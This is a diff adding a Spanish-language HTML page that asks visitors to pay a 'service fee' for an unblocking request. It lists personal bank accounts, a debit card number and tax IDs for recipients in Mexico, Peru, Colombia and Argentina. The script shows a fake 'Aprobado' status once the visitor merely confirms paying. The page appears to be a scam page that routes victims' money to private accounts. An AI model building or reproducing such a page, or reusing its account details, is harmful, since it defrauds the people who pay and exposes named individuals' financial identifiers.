@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.7/dist/css/bootstrap.min.css" rel="stylesheet">
+</head>
+
+<body class="bg-light">
+
+<div class="container mt-5">
+
+    <div class="card shadow mx-auto p-4" style="max-width:600px;">
+
+        <h2 class="text-center mb-4">
+            Completa tu pago
+        </h2>
+
+        <p>
+            Tu solicitud ha sido recibida.
+        </p>
+
+        <p>
+            Para comenzar a procesar tu solicitud de desbloqueo, completa el pago del servicio requerido.
+        </p>
+
+        <div id="serviceFee" class="alert alert-info">
+            <strong>Tarifa de servicio:</strong> se requiere $100 para procesar.
+        </div>
+
+        <div id="paymentStatus" class="alert alert-danger" style="display:none;">
+            Estado del pago: <strong>Rechazado</strong>
+        </div>
+
+        <h5>Detalles de pago</h5>
+
+        <div class="mb-3">
+            <label for="countrySelect" class="form-label">Elige tu país</label>
+            <select id="countrySelect" class="form-select">
+                <option value="" selected>Selecciona un país</option>
+                <option value="mexico">México</option>
+                <option value="peru">Perú</option>
+                <option value="colombia">Colombia</option>
+                <option value="argentina">Argentina</option>
+            </select>
+        </div>
+
+        <div id="confirmationMessage" class="alert alert-secondary" style="display:none;">
+            Selecciona un país para ver los detalles del pago.
+        </div>
+
+        <div id="mexico" class="payment-details" style="display:none;">
+            <h4>🇲🇽 México</h4>
+            <p>Banco: BBVA</p>
+            <p>Alicia Guerrero morales</p>
+            <p>Tarjeta debito - 4152 3146 5216 4453</p>
+            <p>CLABE - 012320015258789593</p>
+        </div>
+
+        <div id="peru" class="payment-details" style="display:none;">
+            <h4>🇵🇪 Perú</h4>
+            <p>Banco: yape</p>
+            <p>Nelly  Mar*</p>
+            <p>Cuenta: 907544236</p>
+        </div>
+
+        <div id="colombia" class="payment-details" style="display:none;">
+            <h4>🇨🇴 Colombia</h4>
+            <p>Banco: Nequi</p>
+            <p>Nombre: ROBINSON MORENO</p>
+            <p>Numero: 3236417145</p>
+        </div>
+
+        <div id="argentina" class="payment-details" style="display:none;">
+            <h4>🇦🇷 Argentina</h4>
+            <p>Banco: Naranja X</p>
+            <p>CBU: 4530000800019693547941</p>
+            <p>Alias: MVALLEJOS9192.NX.ARS</p>
+            <p>Caja de ahorro en pesos - 1969354794</p>
+            <p>CUIL: 27430196265</p>
+        </div>
+
+        <a id="completePaymentButton" href="success.html" class="btn btn-success w-100 disabled" tabindex="-1" aria-disabled="true">
+            Ya hice el pago
+        </a>
+
+        <script>
+            const countrySelect = document.getElementById('countrySelect');
+            const paymentDetails = document.querySelectorAll('.payment-details');
+            const completeButton = document.getElementById('completePaymentButton');
+            const confirmationMessage = document.getElementById('confirmationMessage');
+            const paymentStatus = document.getElementById('paymentStatus');
+            const serviceFee = document.getElementById('serviceFee');
+            const defaultButtonText = 'Ya hice el pago';
+
+            const feeMap = {
+                mexico: '800 MXN',
+                peru: '50 PEN',
+                colombia: '180000 COP',
+                argentina: '4600 ARS'
+            };
+
+            function hideAllDetails() {
+                paymentDetails.forEach(detail => {
+                    detail.style.display = 'none';
+                });
+            }
+
+            function updateCompleteButton(enabled) {
+                if (enabled) {
+                    completeButton.classList.remove('disabled');
+                    completeButton.removeAttribute('tabindex');
+                    completeButton.removeAttribute('aria-disabled');
+                } else {
+                    completeButton.classList.add('disabled');
+                    completeButton.setAttribute('tabindex', '-1');
+                    completeButton.setAttribute('aria-disabled', 'true');
+                }
+            }
+
+            function updateConfirmationMessage(selected) {
+                if (selected) {
+                    confirmationMessage.textContent = `País seleccionado: ${selected.charAt(0).toUpperCase() + selected.slice(1)}. Usa la información de pago de abajo para completar tu transacción.`;
+                    confirmationMessage.className = 'alert alert-success';
+                    confirmationMessage.style.display = 'block';
+                } else {
+                    confirmationMessage.textContent = 'Selecciona un país para ver los detalles del pago.';
+                    confirmationMessage.className = 'alert alert-secondary';
+                    confirmationMessage.style.display = 'block';
+                }
+            }
+
+            function updateServiceFee(selected) {
+                if (selected && feeMap[selected]) {
+                    serviceFee.innerHTML = `<strong>Tarifa de servicio:</strong> ${feeMap[selected]}`;
+                } else {
+                    serviceFee.innerHTML = `<strong>Tarifa de servicio:</strong> se requiere $100 para procesar.`;
+                }
+            }
+
+            function updateCompleteButtonText(selected) {
+                if (selected && feeMap[selected]) {
+                    completeButton.textContent = `Pagar ${feeMap[selected]} y continuar`;
+                } else {
+                    completeButton.textContent = defaultButtonText;
+                }
+            }
+
+            function showRejectedPayment() {
+                paymentStatus.className = 'alert alert-danger';
+                paymentStatus.innerHTML = 'Estado del pago: <strong>Rechazado</strong>';
+                paymentStatus.style.display = 'block';
+            }
+
+            function showApprovedPayment() {
+                paymentStatus.className = 'alert alert-success';
+                paymentStatus.innerHTML = 'Estado del pago: <strong>Aprobado</strong>';
+                paymentStatus.style.display = 'block';
+            }
+
+            completeButton.addEventListener('click', function(event) {
+                const selected = countrySelect.value;
+                if (!selected) {
+                    event.preventDefault();
+                    updateConfirmationMessage('');
+                    showRejectedPayment();
+                    return;
+                }
+
+                const confirmed = confirm('¿Ya completaste tu pago?');
+                if (!confirmed) {
+                    event.preventDefault();
+                    showRejectedPayment();
+                } else {
+                    showApprovedPayment();
+                }
+            });
+
+            countrySelect.addEventListener('change', function() {
+                hideAllDetails();
+                const selected = countrySelect.value;
+                if (selected) {
+                    document.getElementById(selected).style.display = 'block';
+                    updateCompleteButton(true);
+                } else {
+                    updateCompleteButton(false);
+                }
+                paymentStatus.style.display = 'none';
+                updateConfirmationMessage(selected);
+                updateServiceFee(selected);
+                updateCompleteButtonText(selected);
+            });
+
+            updateCompleteButton(false);
+            updateConfirmationMessage('');
+            updateServiceFee('');
+            updateCompleteButtonText('');
+            paymentStatus.style.display = 'none';
+        </script>
+
+    </div>
+
+</div>
+
+</body>
+</html>
